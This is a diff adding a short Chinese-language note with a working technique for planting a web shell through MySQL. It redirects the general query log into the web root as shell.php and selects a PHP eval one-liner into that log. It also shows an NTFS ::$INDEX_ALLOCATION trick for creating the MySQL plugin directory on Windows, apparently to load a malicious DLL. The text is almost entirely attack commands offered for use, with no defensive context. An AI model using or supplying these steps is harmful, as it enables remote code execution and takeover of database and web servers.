@@ -1,0 +1,19 @@
+当mysql高版本默认secure file priv为null的时候
+无法通过outfile拿SHELL，除非把secure file priv改为""
+尝试执行语句set secure file priv="";不成功，提示该参数只读。
+新的拿SHELL的方法：
+执行语句
+SET GLOBAL general_log='on'；
+再执行语句
+SET GLOBAL general_log_file='/var/www/html/shell.php'；
+再次执行语句
+select "<?php @eval($_POST['cmd']);?>";
+getshell成功
+
+
+C:\phpStudy\MySQL\lib\plugin\
+
+SET GLOBAL general_log_file='C:\\phpStudy\\MySQL\\lib\\plugin\\1.txt';
+
+
+select 'It is dll' into dumpfile 'C:\\phpStudy\\MySQL\\lib\\plugin\\plugin::$INDEX_ALLOCATION';
